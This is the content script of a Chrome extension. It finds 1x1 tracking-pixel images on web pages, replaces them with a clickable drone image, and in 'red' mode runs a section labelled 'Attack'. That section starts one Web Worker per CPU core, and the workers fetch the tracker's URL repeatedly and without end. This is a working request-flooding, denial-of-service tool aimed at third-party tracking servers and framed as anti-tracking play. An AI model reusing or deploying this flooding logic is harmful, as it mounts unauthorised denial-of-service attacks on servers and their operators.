console.debug('contentScript running');

chrome.storage.local.clear(() => {
  console.debug('storage cleared');
});

chrome.storage.local.set({green: true});
chrome.storage.local.set({red: false});

let attacking = false;
let pixelTag = findPixelTag();
let sourceURL = pixelTag ? pixelTag.src : '';
let replaceURL = chrome.runtime.getURL("images/drone.png");
const width = '4rem';
const height = 'auto';
const className = 'hvr-bob';

function findPixelTag() {
  let pixelTag = document.querySelector("img[width='1'], img[height='1']");
  if (pixelTag) {
    console.debug('found a pixel tracker');
    let sourceURL = pixelTag.src;
    chrome.runtime.sendMessage({pixelTagURL: sourceURL});
    chrome.storage.local.set({pixelTagURL: sourceURL});
    chrome.runtime.sendMessage({found: true});
    chrome.storage.local.set({found: true});
    chrome.storage.local.get(['green'], (data) => {
      if (data.green) {
        showDrone();
      }
    });
  } else {
    console.debug('no pixel tracker found');
    chrome.runtime.sendMessage({found: false});
    chrome.storage.local.set({found: false});
  }
  return pixelTag;
}

function showDrone() {
  pixelTag.src = replaceURL;
  pixelTag.style.width = width;
  pixelTag.style.height = height;
  pixelTag.classList.add(className);

  pixelTag.onclick = (_e) => {
    chrome.storage.local.get(['red'], (data) => {
      if (data.red) {
        // console.debug('Attacking ' + sourceURL);
        // let n = 0;
        let interval = setInterval(() => {
          // if (n >= 50) {
          //   console.debug('done');
          //   clearInterval(interval);
          //   setTimeout(() => {
          //     pixelTag.className = "hvr-bob";
          //     pixelTag.style.filter = "hue-rotate(0deg)";
          //   }, 1000);
          // }
          let val = getRandomAngle(0, 360);
          if (pixelTag.className !== 'hvr-buzz') {
            pixelTag.className = 'hvr-buzz';
          }
          if (val % 3 === 0) {
            pixelTag.style.filter = `brightness(${val / 360 + 0.3})`;
          } else {
            pixelTag.style.filter = `hue-rotate(${val}deg)`;
          }
          // n++;
        }, 200);

        let workerCode = `
        onmessage = function(e) {
          console.log('Worker: Message received');
          let url = e.data[0];
          fetch(url).then((data) => {
            this.postMessage('done');
          });
        }
        `;

        /* Attack */
        if (window.Worker) {
          let URL = window.webkitURL || window.URL;
          let bb = new Blob([workerCode], {type: 'text/javascript'});
          let workerfile = URL.createObjectURL(bb);
          let maxWorkers = navigator.hardwareConcurrency || 4;
          let workerPool = [];
          let counter = maxWorkers - 1;
          for (let i = 0; i < maxWorkers; i++) {
            workerPool.push(new Worker(workerfile));
          }

          let cb = (worker) => {
            if (!attacking) {
              console.debug('cleaning up Web Workers');
              workerPool.forEach((worker) => worker.terminate());
              clearInterval(interval);
              setTimeout(() => {
                pixelTag.className = "hvr-bob";
                pixelTag.style.filter = "hue-rotate(0deg)";
              }, 1000);
            } else {
              worker.postMessage([sourceURL]);
              worker.onmessage = (_) => {
                counter--;
                if (counter <= 0) {
                  counter = maxWorkers;
                  workerPool.forEach(cb);
                }
              };
            }
          };

          workerPool.forEach(cb);
        };
      }
    });
  };
}

function hideDrone() {
  pixelTag.src = sourceURL;
  pixelTag.style.width = '1px';
  pixelTag.style.height = '1px';
  pixelTag.classList.remove(className);
}

// Checked
chrome.runtime.onMessage.addListener((message) => {
  if (message === 'findTag') {
    findPixelTag();
  } else {
    const {type, data} = message;
    if (type === 'show') {
      if (data) {
        showDrone();
      } else {
        hideDrone();
      }
    } else if (type === 'attacking') {
      attacking = data;
    }
  }
});

function getRandomAngle(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min)) + min;
}
